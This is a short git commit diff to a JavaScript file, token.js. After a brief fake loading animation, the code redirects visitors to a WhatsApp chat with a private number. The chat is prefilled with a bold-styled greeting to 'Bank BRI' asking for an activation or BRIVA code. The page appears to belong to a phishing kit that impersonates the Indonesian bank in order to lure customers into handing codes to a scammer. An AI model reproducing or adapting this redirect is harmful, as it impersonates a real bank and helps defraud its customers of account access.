2155ebeca118c8a7290f84566635fab04daed87f
gopay882 <gopay882@gmail.com>
2024-09-30 16:05:26 +0700

    Update token.js

--- token.js
+++ token.js
@@ -124,7 +124,7 @@ $(document).ready(function() {
     $("#process1").show();
  $('.load').fadeIn();
     setTimeout(function(){      
-location.href='https://wa.me/6282240002169?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20request%20kode%20Aktivasi';
+location.href='https://wa.me/6282240002169?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20request%20kode%20BRIVA';
  $("#process1").hide();
  $('.load').fadeOut();        
          }, 2000);
